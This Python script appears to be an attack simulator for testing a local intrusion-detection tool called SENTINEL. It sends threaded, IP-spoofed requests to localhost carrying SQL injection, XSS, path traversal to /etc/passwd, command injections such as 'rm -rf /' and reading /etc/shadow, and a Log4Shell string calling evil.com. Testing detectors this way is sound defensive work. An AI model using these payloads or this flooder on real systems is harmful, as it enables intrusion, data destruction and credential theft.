# attacks/mass_attacker.py
import requests
import threading
import time
import random

RED    = '\033[91m'
GREEN  = '\033[92m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
RESET  = '\033[0m'

# correct target — SENTINEL main server
TARGET_URL = "http://127.0.0.1:5000/login_attempt"

PAYLOADS = [
    ("SQL_INJECTION",     "admin' OR '1'='1"),
    ("SQL_INJECTION",     "' UNION SELECT null, null, null--"),
    ("SQL_INJECTION",     "1; DROP TABLE users--"),
    ("XSS_ATTACK",        "<script>alert('System Compromised')</script>"),
    ("XSS_ATTACK",        "<img src=x onerror=alert(1)>"),
    ("PATH_TRAVERSAL",    "../../../../etc/passwd"),
    ("COMMAND_INJECTION", "admin; rm -rf /"),
    ("COMMAND_INJECTION", "| cat /etc/shadow"),
    ("BRUTE_FORCE",       "admin:password123"),
    ("LOG4SHELL",         "${jndi:ldap://evil.com/a}"),
]

def random_ip():
    return f"{random.randint(11,220)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"

def fire_attack(thread_id):
    while True:
        attack_type, payload = random.choice(PAYLOADS)
        spoofed_ip = random_ip()
        headers = {'X-Forwarded-For': spoofed_ip}
        data    = {'username': payload, 'password': 'hacked'}

        try:
            res = requests.post(TARGET_URL, data=data, headers=headers, timeout=3)

            if res.status_code == 403:
                print(f"{RED}[BOT-{thread_id:02d}] BLOCKED by SENTINEL | IP:{spoofed_ip} | {attack_type}{RESET}")
            elif res.status_code == 200:
                print(f"{YELLOW}[BOT-{thread_id:02d}] PAYLOAD SENT      | IP:{spoofed_ip} | {attack_type}{RESET}")
            else:
                print(f"{CYAN}[BOT-{thread_id:02d}] HTTP {res.status_code}           | IP:{spoofed_ip} | {attack_type}{RESET}")

        except requests.exceptions.ConnectionError:
            print(f"{GREEN}[BOT-{thread_id:02d}] CONNECTION REFUSED — is SENTINEL running on port 5000?{RESET}")
            time.sleep(3)
        except requests.exceptions.Timeout:
            print(f"{YELLOW}[BOT-{thread_id:02d}] TIMEOUT — server busy{RESET}")
        except Exception as e:
            print(f"{RED}[BOT-{thread_id:02d}] ERROR: {e}{RESET}")

        time.sleep(random.uniform(0.3, 1.2))


def start_cyber_attack():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{RED}{'='*56}")
    print("  ORBITAL CANNON — MASS BOTNET ATTACK SIMULATOR")
    print(f"{'='*56}{RESET}")
    print(f"[*] Target   : {TARGET_URL}")
    print(f"[*] Threads  : 30 concurrent bots")
    print(f"[*] IP Mode  : Random spoofing per request")
    print(f"[*] Payloads : SQL, XSS, CMDi, PathTraversal, Log4Shell")
    print()
    print("Launching in 3 seconds... (CTRL+C to stop)")
    time.sleep(3)

    for i in range(30):
        t = threading.Thread(target=fire_attack, args=(i,), daemon=True)
        t.start()
        time.sleep(0.05)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[*] ATTACK ABORTED.{RESET}")


if __name__ == "__main__":
    start_cyber_attack()
